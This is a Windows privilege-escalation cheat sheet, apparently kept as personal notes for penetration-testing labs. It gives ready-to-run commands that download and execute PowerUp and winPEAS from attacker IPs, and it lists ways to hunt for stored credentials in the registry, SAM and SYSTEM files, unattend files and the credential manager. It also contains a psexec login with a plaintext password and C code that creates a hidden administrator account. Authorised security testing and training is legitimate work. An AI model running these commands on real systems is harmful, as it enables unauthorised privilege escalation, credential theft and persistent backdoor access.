---
title: initial
category: win privesc
order: 1
---

>**IMPORTANTE**    
>dir /r  
>dir /A
> Get-ChildItem . -Force
---

# Automatic tools
---
## 1 powerup
#### | from file
```
c:> powershell.exe -nop -exec bypass
PS C:> ./PowerUp.ps1
PS C:> Invoke-AllChecks
```
```
c:> powershell.exe -nop -exec bypass
PS c:> Import-MOdule ./PowerUp.ps1
PS c:> Invoke-AllChecks
```
#### | from url
```
powershell.exe  -nop -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')"
```


## 2 winpeas
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\users\Administrator\Documents\wp.exe')"

c:\users\kosts\Desktop> .\wp.exe
```

## 3 watson
same as winpeas
&nbsp;
&nbsp;
# Manual info gathering
---

## Operating System

#### | what os and arch?

```
systeminfo
wmic qfe
```

#### | environment variables

```
set
```
```
Get-ChildItem Env: | ft Key,Value
```
#### | drives

```
net use
wmic logicaldisk get caption, description, providername
wmic logicaldisk get name
wmic logicaldisk get caption
diskpart
list volume
```

```
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

get-psdrive -psprovider filesystem

```


#### | mount/map

```
net use \\IP address\IPC$ "" /u:""
net use \\192.168.1.101\IPC$ "" /u:""
```
&nbsp;
&nbsp;
## Users
#### | whoami

```
whoami /priv
echo %USERNAME%
```
```
$env:UserName
```
#### | other users

```
net users
net users /domain
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\"
```
```
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem c:\Users -Force | select Name
```

#### | logged in?

```
qwinsta
```

#### | groups

```
net localgroup
```
```
Get-LocalGroup | ft Name
```

#### | any admin?  

```
net localgroup Administrators
```
```
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### | registry autologon?

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
```
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```
#### | Credential manager?

```
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
```
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
#### | can we access SAM and System ?

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

&nbsp;
&nbsp;
## programs, process and services

#### | what is installed?

```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### | any weak folder or file permission?  

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```
#### | Modify Permissions for Everyone or Users on Program Folders?

```
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
```
```
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

#### | accesschk  to check for writeable folders and files.

```
accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *
```
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

#### | whats running? ports?

```
tasklist /svc
tasklist /v
net start
sc query
```
```
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Get-Service
```
This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.
```
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```
#### | kill a  process

```
taskkill /PID 1532 /F
```

#### | weak service permission?

```
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```
#### | Are there any unquoted service paths?

```
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
```
```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
#### | scheduled tasks?

```
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
```
```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
#### | startup?

```
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

#### | is alwaysinstallelevated enabled?

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
&nbsp;
&nbsp;
## networking
#### | basic
```
ipconfig /allows
```
```
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
#### | routes?
```
route print
```
```
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

#### | arp cache?
```
arp -a
```
```
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
#### | conection to others?
```
netstat -ano
```
#### | host file?
```
C:\WINDOWS\System32\drivers\etc\hosts
```
#### | firewall?
```
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
```
#### | more interfaces?
```
netsh dump
```
#### | snmp configurations?
```
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 ```
 ```
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```

## Files and Sensitive Information
#### | passwords in registry?
```
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

#### | sysprep or unattended?

```
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

#### | IIS       
```
dir /a C:\inetpub\
dir /s web.config
dir /s *root.txt 2>nul

C:\Windows\System32\inetsrv\config\applicationHost.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
#### | iis logs
```
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
```

#### | Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
```
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
```
```
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
```
#### | apache logs?
```
dir /s access.log error.log
```
```
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
#### | any common insta win?
```
dir /s *pass* == *vnc* == *.config* 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul
```
```
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

```
tasklist
systeminfo
whoami /priv
net users
net user <user>
ipconfig /all
netstat -ano
netsh firewall show state
netsh firewall show config
netsh advfirwall firewall show rule name=all
schtasks /query /fo LIST /v
```

#### | check updates
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

* check configuration files who might store credentials
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
&nbsp;
&nbsp;
&nbsp;
# exploit suggester
---

## from kali with systeminfo
#### | Windows Exploit Suggester - Next Generation  
https://github.com/bitsadmin/wesng

#### | Windows Exploit Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```
python /home/nikhil/scripts/windows-exploit-suggester.py -d 2016-07-02-mssb.xls -i systeminfo -l
```
 -l : show only local exploits

## from box
#### |  windows-privesc-check v2
https://github.com/pentestmonkey/windows-privesc-check

&nbsp;
&nbsp;
#  comands
---
#### | windows admin to system :
```
PSEXEC.exe -i -s -d CMD
```
#### | connect remotely psexec
temes credenciales y smb esta abierto? proba
```
psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
```
#### | add admin user account
```
net user /add [username] [password]
net localgroup administrators [username] /add
```
OR WITH binary
```
#include
int main()
{ int i;

i = system(“net user /add ashoka qwerty”);
i = system(“net localgroup administrators ashoka /add”);
return 0;

}
```
#### | find weak permissions via Cacls or ICacls
```
cacls “C:\Program Files” /T | findstr Users
or
icacls “C:\Program Files” /T | findstr Users
```

```
icacls  "c:\program files\serviio\bin\serviioService.exe"
```

&nbsp;
&nbsp;
# anexo
based on : https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
